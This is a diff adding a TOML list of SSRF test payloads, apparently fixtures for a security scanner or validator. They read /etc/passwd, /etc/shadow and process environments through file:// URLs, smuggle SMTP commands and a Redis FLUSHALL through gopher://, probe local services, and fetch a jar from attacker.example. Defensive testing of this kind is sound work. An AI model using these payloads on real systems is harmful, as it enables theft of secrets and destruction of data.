@@ -1,0 +1,72 @@
+schema = 1
+# Non-HTTP protocol SSRF.
+
+[[case]]
+id = "file_passwd"
+class = "ssrf"
+payload = "file:///etc/passwd"
+
+[[case]]
+id = "file_shadow"
+class = "ssrf"
+payload = "file:///etc/shadow"
+
+[[case]]
+id = "file_proc_self_environ"
+class = "ssrf"
+payload = "file:///proc/self/environ"
+
+[[case]]
+id = "file_proc_cmdline"
+class = "ssrf"
+payload = "file:///proc/self/cmdline"
+
+[[case]]
+id = "gopher_smtp"
+class = "ssrf"
+payload = "gopher://127.0.0.1:25/_HELO%20attacker%0d%0aMAIL%20FROM:%3Cattacker@x%3E"
+
+[[case]]
+id = "gopher_redis"
+class = "ssrf"
+payload = "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a"
+
+[[case]]
+id = "gopher_mysql"
+class = "ssrf"
+payload = "gopher://127.0.0.1:3306/_handshake"
+
+[[case]]
+id = "dict_localhost"
+class = "ssrf"
+payload = "dict://127.0.0.1:11211/stats"
+
+[[case]]
+id = "ldap_localhost"
+class = "ssrf"
+payload = "ldap://127.0.0.1:389/"
+
+[[case]]
+id = "ftp_localhost"
+class = "ssrf"
+payload = "ftp://127.0.0.1/"
+
+[[case]]
+id = "tftp_localhost"
+class = "ssrf"
+payload = "tftp://127.0.0.1/x"
+
+[[case]]
+id = "sftp_localhost"
+class = "ssrf"
+payload = "sftp://127.0.0.1/etc/passwd"
+
+[[case]]
+id = "jar_url"
+class = "ssrf"
+payload = "jar:http://attacker.example/x.zip!/x"
+
+[[case]]
+id = "netdoc_url"
+class = "ssrf"
+payload = "netdoc:///etc/passwd"
